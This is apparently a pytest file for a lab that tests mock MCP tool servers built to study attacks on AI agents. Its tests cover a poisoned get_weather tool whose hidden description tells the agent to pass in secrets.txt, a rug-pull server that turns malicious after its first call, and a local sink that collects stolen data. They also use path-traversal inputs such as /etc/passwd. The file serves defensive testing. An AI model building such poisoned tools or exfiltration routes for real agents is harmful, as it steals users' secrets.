"""Mock tools, called through a real MCP client session. Their refusals are safety boundaries."""

import json
import subprocess
import sys
from collections.abc import Callable
from pathlib import Path
from typing import Any

import httpx
import pytest
from mcp.server.fastmcp import FastMCP
from mcp.shared.memory import create_connected_server_and_client_session
from mcp.types import CallToolResult, ImageContent, TextContent

from lab.attack_site.build import ATTACK_IMAGE, build_site
from lab.fixtures import content
from lab.fixtures.runs import RunPaths, create_run, load_canaries
from lab.mcp_servers import evil_server, files_server, http_server, mail_server, web_server
from lab.mcp_servers.common import RUN_DIR_ENV, paths_from_env, require_local_url

SITE_PORT = 8081
SINK_PORT = 9999


class Recorder:
    """A fake network that records what would have been sent."""

    def __init__(self, status: int = 200, body: bytes = b"<html>page</html>") -> None:
        self.requests: list[httpx.Request] = []
        self.status = status
        self.body = body

    def transport(self) -> httpx.MockTransport:
        def handle(request: httpx.Request) -> httpx.Response:
            self.requests.append(request)
            return httpx.Response(self.status, content=self.body)

        return httpx.MockTransport(handle)


async def call(server: FastMCP, tool: str, **args: Any) -> CallToolResult:
    async with create_connected_server_and_client_session(server) as session:
        return await session.call_tool(tool, args)


def text_of(result: CallToolResult) -> str:
    block = result.content[0]
    assert isinstance(block, TextContent)
    return block.text


async def tool_names(server: FastMCP) -> set[str]:
    async with create_connected_server_and_client_session(server) as session:
        return {tool.name for tool in (await session.list_tools()).tools}


@pytest.fixture
def run(tmp_path: Path) -> RunPaths:
    return create_run(tmp_path, "run1", with_attacks=True)


# Local URL check


@pytest.mark.parametrize(
    ("url", "expected"),
    [
        ("http://localhost:8081/a.html", "http://127.0.0.1:8081/a.html"),
        ("http://127.0.0.1:8081/a.html?x=1", "http://127.0.0.1:8081/a.html?x=1"),
        ("http://127.1:8081/a.html", "http://127.0.0.1:8081/a.html"),
        ("http://user:pw@localhost:8081/a", "http://127.0.0.1:8081/a"),
        ("http://localhost:8081", "http://127.0.0.1:8081/"),
    ],
)
def test_local_urls_are_rebuilt_on_loopback(url: str, expected: str) -> None:
    assert require_local_url(url, SITE_PORT, "tool") == expected


@pytest.mark.parametrize(
    "url",
    [
        "http://localhost:8000/v1/policy/mode",
        "http://127.0.0.1:8765/mcp",
        "http://localhost/",
        "http://example.org:8081/",
        "http://localhost:8081@example.org/",
        "https://localhost:443/",
        "file:///etc/passwd",
        "not a url",
    ],
)
def test_everything_else_is_refused(url: str) -> None:
    with pytest.raises(ValueError, match="refused"):
        require_local_url(url, SITE_PORT, "tool")


def test_run_dir_comes_from_the_environment(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    monkeypatch.setenv(RUN_DIR_ENV, str(tmp_path))
    assert paths_from_env().root == tmp_path


def test_missing_run_dir_is_an_error(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv(RUN_DIR_ENV, raising=False)
    with pytest.raises(RuntimeError, match=RUN_DIR_ENV):
        paths_from_env()


# Web


async def test_web_server_offers_the_documented_tools() -> None:
    names = await tool_names(web_server.build_server(SITE_PORT))
    assert names == {"web_fetch", "fetch_image", "read_image_text"}


async def test_web_fetch_returns_the_page() -> None:
    network = Recorder()
    server = web_server.build_server(SITE_PORT, network.transport())
    result = await call(server, "web_fetch", url="http://localhost:8081/a02_article.html")
    assert text_of(result) == "<html>page</html>"
    assert str(network.requests[0].url) == "http://127.0.0.1:8081/a02_article.html"


@pytest.mark.parametrize("tool", ["web_fetch", "fetch_image", "read_image_text"])
@pytest.mark.parametrize("url", ["http://example.org/", "http://localhost:8000/health"])
async def test_web_tools_refuse_other_hosts(tool: str, url: str) -> None:
    network = Recorder()
    result = await call(web_server.build_server(SITE_PORT, network.transport()), tool, url=url)
    assert result.isError
    assert network.requests == []


async def test_web_fetch_does_not_follow_redirects() -> None:
    network = Recorder(status=302)
    server = web_server.build_server(SITE_PORT, network.transport())
    result = await call(server, "web_fetch", url="http://localhost:8081/moved")
    assert result.isError
    assert len(network.requests) == 1


async def test_fetch_image_returns_image_content() -> None:
    network = Recorder(body=b"\x89PNG data")
    server = web_server.build_server(SITE_PORT, network.transport())
    result = await call(server, "fetch_image", url="http://localhost:8081/a.png")
    block = result.content[0]
    assert isinstance(block, ImageContent)
    assert block.mimeType == "image/png"


async def test_read_image_text_uses_the_reader() -> None:
    async def fake_reader(data: bytes) -> str:
        return "read: image"

    network = Recorder(body=b"image")
    server = web_server.build_server(SITE_PORT, network.transport(), fake_reader)
    result = await call(server, "read_image_text", url="http://localhost:8081/a.png")
    assert text_of(result) == "read: image"


@pytest.mark.slow
async def test_real_ocr_reads_the_attack_image(tmp_path: Path) -> None:
    build_site(tmp_path, SINK_PORT)
    text = await web_server.ocr_text((tmp_path / ATTACK_IMAGE).read_bytes())
    assert "http://127.0.0.1:9999/collect" in text
    assert "secrets.txt" in text
    assert "http_post" in text


# Mail


async def test_mail_server_offers_the_documented_tools(run: RunPaths) -> None:
    assert await tool_names(mail_server.build_server(run)) == {
        "list_emails",
        "read_email",
        "send_email",
    }


async def test_list_emails_leaves_out_the_bodies(run: RunPaths) -> None:
    result = await call(mail_server.build_server(run), "list_emails")
    summaries = json.loads(text_of(result))
    assert {item["id"] for item in summaries} == {"m1", "m2", "m3", "m4"}
    assert all("body" not in item for item in summaries)


async def test_read_email_returns_the_body(run: RunPaths) -> None:
    result = await call(mail_server.build_server(run), "read_email", id="m3")
    assert "ignore my previous email" in text_of(result)


async def test_unknown_email_is_an_error(run: RunPaths) -> None:
    assert (await call(mail_server.build_server(run), "read_email", id="missing")).isError


async def test_send_email_only_writes_to_the_outbox(run: RunPaths) -> None:
    server = mail_server.build_server(run)
    await call(server, "send_email", to="a@company.example", subject="Hi", body="One")
    await call(server, "send_email", to="b@attacker.local", subject="Hi", body="Two")
    outbox = json.loads(run.outbox.read_text(encoding="utf-8"))
    assert [item["to"] for item in outbox] == ["a@company.example", "b@attacker.local"]
    assert outbox[1]["body"] == "Two"


def test_mail_server_has_no_way_to_really_send() -> None:
    source = Path(mail_server.__file__).read_text(encoding="utf-8")
    assert "smtplib" not in source
    assert "httpx" not in source


# Files


async def test_files_server_offers_the_documented_tools(run: RunPaths) -> None:
    assert await tool_names(files_server.build_server(run)) == {
        "list_files",
        "read_file",
        "write_file",
        "delete_file",
    }


async def test_list_files_includes_the_decoys(run: RunPaths) -> None:
    listing = text_of(await call(files_server.build_server(run), "list_files"))
    assert {"notes.md", "report.csv", ".env", "secrets.txt"} <= set(listing.split("\n"))


async def test_read_file_returns_canaries_so_attacks_are_real(run: RunPaths) -> None:
    text = text_of(await call(files_server.build_server(run), "read_file", path="secrets.txt"))
    assert load_canaries(run).api_key in text


async def test_write_then_read_a_nested_file(run: RunPaths) -> None:
    server = files_server.build_server(run)
    await call(server, "write_file", path="drafts/note.txt", content="नमस्ते")
    assert text_of(await call(server, "read_file", path="drafts/note.txt")) == "नमस्ते"


async def test_delete_file_removes_it(run: RunPaths) -> None:
    await call(files_server.build_server(run), "delete_file", path=content.REPORT_FILE)
    assert not (run.sandbox / content.REPORT_FILE).exists()


@pytest.mark.parametrize("tool", ["read_file", "delete_file"])
async def test_missing_files_are_errors(run: RunPaths, tool: str) -> None:
    assert (await call(files_server.build_server(run), tool, path="missing.txt")).isError


@pytest.mark.parametrize(
    "path",
    [
        "../canaries.json",
        "../../outside.txt",
        "drafts/../../canaries.json",
        "..\\canaries.json",
        "C:\\Windows\\win.ini",
        "C:/Windows/win.ini",
        "/etc/passwd",
        "\\\\server\\share\\x",
        "notes.md:hidden",
        "",
        ".",
    ],
)
@pytest.mark.parametrize("tool", ["read_file", "delete_file"])
async def test_paths_outside_the_sandbox_are_refused(run: RunPaths, tool: str, path: str) -> None:
    result = await call(files_server.build_server(run), tool, path=path)
    assert result.isError
    assert run.canaries.exists()


async def test_writing_outside_the_sandbox_is_refused(run: RunPaths) -> None:
    server = files_server.build_server(run)
    result = await call(server, "write_file", path="../escaped.txt", content="x")
    assert result.isError
    assert not (run.root / "escaped.txt").exists()


async def test_symlinks_cannot_escape_the_sandbox(run: RunPaths) -> None:
    link = run.sandbox / "link.json"
    try:
        link.symlink_to(run.canaries)
    except OSError:
        pytest.skip("creating symlinks needs extra rights on this machine")
    assert (await call(files_server.build_server(run), "read_file", path="link.json")).isError


def make_junction(link: Path, target: Path) -> None:
    command = ["cmd", "/c", "mklink", "/J", str(link), str(target)]
    subprocess.run(command, check=True, capture_output=True)


@pytest.mark.skipif(sys.platform != "win32", reason="junctions are a Windows feature")
async def test_directory_junctions_cannot_escape_the_sandbox(run: RunPaths) -> None:
    """Junctions need no special rights on Windows, so this is the realistic link escape."""
    junction = run.sandbox / "escape"
    make_junction(junction, run.root)
    assert (junction / "canaries.json").is_file()
    server = files_server.build_server(run)
    assert (await call(server, "read_file", path="escape/canaries.json")).isError
    assert (await call(server, "delete_file", path="escape/canaries.json")).isError
    assert run.canaries.exists()


# HTTP


async def test_http_post_reaches_the_sink() -> None:
    network = Recorder()
    server = http_server.build_server(SINK_PORT, network.transport())
    result = await call(server, "http_post", url="http://127.0.0.1:9999/collect", data="stolen")
    assert "HTTP 200" in text_of(result)
    assert network.requests[0].content == b"stolen"
    assert str(network.requests[0].url) == "http://127.0.0.1:9999/collect"


@pytest.mark.parametrize(
    "url",
    [
        "http://localhost:8000/v1/policy/mode",
        "http://127.1:8000/v1/approvals/1",
        "http://2130706433:8000/v1/policy",
        "http://127.0.0.1:8765/mcp",
        "http://localhost:8081/",
        "http://example.org/",
        "https://example.org:9999/",
    ],
)
async def test_http_post_cannot_reach_anything_but_the_sink(url: str) -> None:
    """Regression for G2: this tool must never be able to reach the shield's control plane."""
    network = Recorder()
    server = http_server.build_server(SINK_PORT, network.transport())
    result = await call(server, "http_post", url=url, data="x")
    assert result.isError
    assert network.requests == []


async def test_http_post_reports_an_unreachable_sink() -> None:
    def fail(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("refused")

    server = http_server.build_server(SINK_PORT, httpx.MockTransport(fail))
    result = await call(server, "http_post", url="http://127.0.0.1:9999/x", data="x")
    assert result.isError


# Evil


EvilFactory = Callable[..., evil_server.EvilServer]


@pytest.fixture
def evil(run: RunPaths) -> EvilFactory:
    def build(mode: evil_server.EvilMode, network: Recorder | None = None) -> Any:
        transport = (network or Recorder()).transport()
        return evil_server.EvilServer(run, mode, SINK_PORT, transport)

    return build


async def description(server: FastMCP) -> str:
    async with create_connected_server_and_client_session(server) as session:
        [tool] = (await session.list_tools()).tools
    assert tool.name == "get_weather"
    return tool.description or ""


async def test_poisoned_tool_shows_hidden_instructions(evil: EvilFactory) -> None:
    text = await description(evil("poison"))
    assert "secrets.txt" in text
    assert "context argument" in text


async def input_schema(server: FastMCP) -> dict[str, Any]:
    async with create_connected_server_and_client_session(server) as session:
        [tool] = (await session.list_tools()).tools
    return tool.inputSchema


async def test_poisoned_tool_requires_the_stolen_argument(evil: EvilFactory) -> None:
    schema = await input_schema(evil("poison"))
    assert schema["required"] == ["city", "context"]
    assert "secrets.txt" in schema["properties"]["context"]["description"]


async def test_clean_tool_has_no_context_argument(evil: EvilFactory) -> None:
    schema = await input_schema(evil("rug_pull"))
    assert set(schema["properties"]) == {"city"}
    assert schema["required"] == ["city"]


async def test_rug_pull_also_changes_the_schema(evil: EvilFactory) -> None:
    server = evil("rug_pull")
    await call(server, "get_weather", city="Paris")
    assert "context" in (await input_schema(server))["properties"]


async def test_poisoned_tool_refuses_to_work_without_the_secret(evil: EvilFactory) -> None:
    result = await call(evil("poison"), "get_weather", city="Paris")
    assert result.isError
    assert "secrets.txt" in text_of(result)


async def test_rug_pull_starts_clean(evil: EvilFactory) -> None:
    assert await description(evil("rug_pull")) == evil_server.CLEAN_DESCRIPTION


async def test_rug_pull_changes_after_the_first_call(evil: EvilFactory) -> None:
    server = evil("rug_pull")
    await call(server, "get_weather", city="Paris")
    assert await description(server) == evil_server.POISONED_DESCRIPTION


async def test_rug_pull_state_survives_a_new_server_process(evil: EvilFactory) -> None:
    await call(evil("rug_pull"), "get_weather", city="Paris")
    assert await description(evil("rug_pull")) == evil_server.POISONED_DESCRIPTION


async def test_rug_pull_state_is_per_run(tmp_path: Path) -> None:
    first = create_run(tmp_path, "one", with_attacks=True)
    second = create_run(tmp_path, "two", with_attacks=True)
    await call(evil_server.EvilServer(first, "rug_pull", SINK_PORT), "get_weather", city="Paris")
    other = evil_server.EvilServer(second, "rug_pull", SINK_PORT)
    assert await description(other) == evil_server.CLEAN_DESCRIPTION


async def test_weather_answers_once_it_has_the_context(evil: EvilFactory) -> None:
    result = await call(evil("poison"), "get_weather", city="Paris", context="sk-canary-abc123")
    assert "Paris" in text_of(result)


async def test_poisoned_tool_rejects_an_invented_value(evil: EvilFactory) -> None:
    """The model tends to make up a value instead of reading the file."""
    result = await call(
        evil("poison"), "get_weather", city="Paris", context="eyJzZWN0IjoiYmFja2VyIn0"
    )
    assert result.isError
    assert "read_file" in text_of(result)


async def test_stolen_context_goes_to_the_sink(evil: EvilFactory) -> None:
    network = Recorder()
    await call(evil("poison", network), "get_weather", city="Paris", context="stolen")
    assert network.requests[0].content == b"stolen"
    assert str(network.requests[0].url) == "http://127.0.0.1:9999/evil"


async def test_nothing_is_sent_without_context(evil: EvilFactory) -> None:
    network = Recorder()
    await call(evil("poison", network), "get_weather", city="Paris")
    assert network.requests == []


async def test_a_failed_upload_stays_hidden(run: RunPaths) -> None:
    def fail(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("refused")

    server = evil_server.EvilServer(run, "poison", SINK_PORT, httpx.MockTransport(fail))
    result = await call(server, "get_weather", city="Paris", context="key: stolen")
    assert not result.isError
